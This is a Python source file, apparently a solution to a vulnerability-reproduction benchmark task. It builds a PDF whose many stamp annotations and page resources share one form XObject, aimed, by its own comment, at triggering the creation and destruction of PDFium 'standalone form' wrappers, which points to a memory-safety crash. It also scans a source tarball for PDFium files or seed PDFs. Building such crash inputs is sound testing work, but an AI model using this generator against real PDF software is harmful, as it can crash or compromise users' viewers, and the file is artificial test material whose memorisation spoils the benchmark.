import os
import io
import tarfile
from typing import Dict, Optional, Tuple


def _build_pdf(objects: Dict[int, bytes], root_obj: int) -> bytes:
    header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
    body_parts = []
    offsets: Dict[int, int] = {0: 0}

    cur = len(header)
    for objnum in sorted(objects.keys()):
        offsets[objnum] = cur
        part = (f"{objnum} 0 obj\n".encode("ascii") + objects[objnum] + b"\nendobj\n")
        body_parts.append(part)
        cur += len(part)

    body = b"".join(body_parts)
    xref_offset = len(header) + len(body)
    max_obj = max(objects.keys()) if objects else root_obj

    xref_lines = []
    xref_lines.append(f"xref\n0 {max_obj + 1}\n".encode("ascii"))
    xref_lines.append(b"0000000000 65535 f \n")
    for i in range(1, max_obj + 1):
        off = offsets.get(i)
        if off is None:
            xref_lines.append(b"0000000000 00000 f \n")
        else:
            xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
    xref = b"".join(xref_lines)

    trailer = (
        b"trailer\n<< "
        + f"/Size {max_obj + 1} /Root {root_obj} 0 R ".encode("ascii")
        + b">>\n"
    )

    out = (
        header
        + body
        + xref
        + trailer
        + b"startxref\n"
        + str(xref_offset).encode("ascii")
        + b"\n%%EOF\n"
    )
    return out


def _pdf_stream(dict_inner: bytes, data: bytes) -> bytes:
    return b"<< " + dict_inner + b" /Length " + str(len(data)).encode("ascii") + b" >>\nstream\n" + data + b"endstream"


def _generate_pdf_poc(num_annots: int = 16) -> bytes:
    # Shared form XObject stream used multiple ways to maximize chance of creating/destroying multiple standalone form wrappers.
    app_data = b"q\n0 0 1 rg\n0 0 40 40 re\nf\nQ\n"
    # page content uses two different XObject names pointing to the same object.
    contents_data = (
        b"q 1 0 0 1 20 20 cm /F1 Do Q\n"
        b"q 1 0 0 1 100 100 cm /F2 Do Q\n"
        b"q 1 0 0 1 60 60 cm /F1 Do Q\n"
        b"q 1 0 0 1 140 20 cm /F2 Do Q\n"
    )

    objects: Dict[int, bytes] = {}

    # Object numbers
    catalog_obj = 1
    pages_obj = 2
    page_obj = 3
    contents_obj = 4
    first_annot_obj = 5
    annot_objs = list(range(first_annot_obj, first_annot_obj + num_annots))
    app_obj = first_annot_obj + num_annots  # shared appearance/form stream

    # Catalog
    objects[catalog_obj] = f"<< /Type /Catalog /Pages {pages_obj} 0 R >>".encode("ascii")

    # Pages
    objects[pages_obj] = f"<< /Type /Pages /Kids [{page_obj} 0 R] /Count 1 >>".encode("ascii")

    # Page
    annots_array = b"[" + b" ".join(f"{a} 0 R".encode("ascii") for a in annot_objs) + b"]"
    page_resources = b"<< /XObject << /F1 " + f"{app_obj} 0 R".encode("ascii") + b" /F2 " + f"{app_obj} 0 R".encode("ascii") + b" >> >>"
    objects[page_obj] = (
        b"<< /Type /Page /Parent "
        + f"{pages_obj} 0 R".encode("ascii")
        + b" /MediaBox [0 0 200 200] /Resources "
        + page_resources
        + b" /Contents "
        + f"{contents_obj} 0 R".encode("ascii")
        + b" /Annots "
        + annots_array
        + b" >>"
    )

    # Contents stream
    objects[contents_obj] = _pdf_stream(b"", contents_data)

    # Annotations (Stamp) all sharing the same appearance stream.
    for idx, aobj in enumerate(annot_objs):
        x0 = 10 + (idx % 4) * 45
        y0 = 10 + (idx // 4) * 45
        x1 = x0 + 30
        y1 = y0 + 30
        objects[aobj] = (
            b"<< /Type /Annot /Subtype /Stamp /P "
            + f"{page_obj} 0 R".encode("ascii")
            + b" /Rect ["
            + f"{x0} {y0} {x1} {y1}".encode("ascii")
            + b"] /F 4 /AP << /N "
            + f"{app_obj} 0 R".encode("ascii")
            + b" >> >>"
        )

    # Shared appearance XObject form stream
    objects[app_obj] = _pdf_stream(
        b"/Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 40 40] /Resources << >>",
        app_data,
    )

    return _build_pdf(objects, root_obj=catalog_obj)


def _tar_looks_like_pdf_project(src_path: str) -> bool:
    if not os.path.isfile(src_path):
        return True
    try:
        with tarfile.open(src_path, "r:*") as tar:
            hits = 0
            checked = 0
            for m in tar:
                checked += 1
                n = m.name.lower()
                if "pdfium" in n or "fpdf" in n or "cpdf_" in n:
                    hits += 2
                if "standaloneform" in n or "standalone_form" in n:
                    hits += 3
                if n.endswith(("pdfium_fuzzer.cc", "pdf_fuzzer.cc", "fpdfview.h", "fpdfview_c_api.h")):
                    hits += 3
                if checked >= 2000:
                    break
            return hits >= 3
    except Exception:
        return True


def _try_find_pdf_seed_in_tar(src_path: str) -> Optional[bytes]:
    if not os.path.isfile(src_path):
        return None
    best: Optional[Tuple[int, bytes]] = None
    try:
        with tarfile.open(src_path, "r:*") as tar:
            for m in tar:
                if not m.isfile():
                    continue
                n = m.name.lower()
                if not (n.endswith(".pdf") or n.endswith(".fdf")):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if data.startswith(b"%PDF"):
                    if best is None or len(data) < best[0]:
                        best = (len(data), data)
    except Exception:
        return None
    return best[1] if best else None


class Solution:
    def solve(self, src_path: str) -> bytes:
        seed = _try_find_pdf_seed_in_tar(src_path)
        if seed is not None and len(seed) <= 100_000:
            return seed
        if _tar_looks_like_pdf_project(src_path):
            return _generate_pdf_poc(num_annots=16)
        return _generate_pdf_poc(num_annots=24)